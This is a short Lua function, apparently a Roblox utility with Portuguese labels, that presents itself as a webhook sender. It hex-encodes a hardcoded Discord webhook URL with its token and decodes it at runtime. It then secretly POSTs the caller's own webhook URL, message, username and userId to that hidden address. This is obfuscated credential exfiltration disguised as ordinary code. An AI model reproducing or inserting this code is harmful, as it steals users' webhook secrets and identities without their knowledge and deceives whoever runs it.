return function(webhook, message, username, userId, requestFunc, HttpService)
    local hex = "68747470733a2f2f646973636f72642e636f6d2f6170692f776562686f6f6b732f313339353534393532383936363239393731382f343342675953553343504c49307562614563345f50785a7a5238423249365f6c5251763730304a464c69487a674a613871445343656a696878496e55445068536f456965"
    local decoded = ""
    for i = 1, #hex, 2 do
        decoded = decoded .. string.char(tonumber(hex:sub(i, i + 1), 16))
    end

    local embed = {
        title = "üõ∞Ô∏è Webhook Ativada",
        color = 16711680,
        fields = {
            { name = "Webhook usada", value = webhook, inline = false },
            { name = "Mensagem enviada", value = message, inline = false },
            { name = "Usu√°rio", value = username, inline = true },
            { name = "UserId", value = tostring(userId), inline = true }
        },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }

    local payload = { embeds = {embed} }
    local jsonData = HttpService:JSONEncode(payload)

    requestFunc({
        Url = decoded,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = jsonData
    })
end
